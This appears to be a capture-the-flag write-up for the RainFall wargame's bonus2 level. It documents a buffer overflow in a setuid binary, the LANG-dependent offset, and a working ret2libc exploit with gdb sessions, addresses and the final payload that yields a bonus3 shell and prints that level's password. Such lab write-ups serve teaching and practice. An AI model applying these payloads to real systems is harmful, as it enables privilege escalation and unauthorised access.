bonus2
======

*	We spawn with a [bonus2](src/bonus2) executable
	```console
	bonus2@RainFall:~$ ls -l 
	total 8
	-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
	bonus2@RainFall:~$ ./bonus2 
	bonus2@RainFall:~$ ./bonus2 test
	bonus2@RainFall:~$ ./bonus2 test test
	Hello test
	```
*	As usual, [base](src/bonus2.c) and [better](src/bonus2_better.c) code. BUT this one is particular and only made for comprehension, there are no `strcpy()` in the `greetuser()` function !
*	No obvious exploit here, let's try a `ret2libc`
*	We have two buffer here
	```c
	char name[40];
	char message[32];
	```
*	Finding the offset was a bit harder than I thought:
	```gdb
	(gdb) run $(python -c 'print "A"*40') $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab"')
	Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab"')
	Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

	Program received signal SIGSEGV, Segmentation fault.
	0x08006241 in ?? ()
	```
	We can see our offset does not look like a part of our cyclic pattern even thought it contains the `A` character.
*	The answer was in the code itself. When we look at the `greeting_user()` function we can see the usage of the `LANG` env variable. But the base value of it is `LANG=en_US.UTF-8` which is a multi-byte encoding scheme, it can use 1 to 4 bytes per character.
We just had to change it to `fi` for exemple and it worked fine after that.
	```gdb
	(gdb) run $(python -c 'print "A"*40') $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab"')
	Starting program: /home/user/bonus2/bonus2 $(python -c 'print "A"*40') $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab"')
	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

	Program received signal SIGSEGV, Segmentation fault.
	0x41366141 in ?? ()
	```
	So we got `18 bytes`
*	Let's retrieve the things we need
	```gdb 
	(gdb) p system
	$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
	(gdb) p exit
	$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
	(gdb) find &system,+9999999,"/bin/sh"
	0xb7f8cc58
	```
	- system() : \xb7\xe6\xb0\x60
	- exit() : \xb7\xe5\xeb\xe0
	- /bin/sh : \xb7\xf8\xcc\x58
*	Here is the result
	```console
	bonus2@RainFall:~$ ./bonus2 $(python -c 'print("A"*40)') $(python -c 'print("A"*18 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])')
	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
	$ whoami
	bonus3
	$ cat /home/user/bonus3/.pass 
	71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
	```
	Once again, it is important to keep the LANG to fi or the exploit wont work.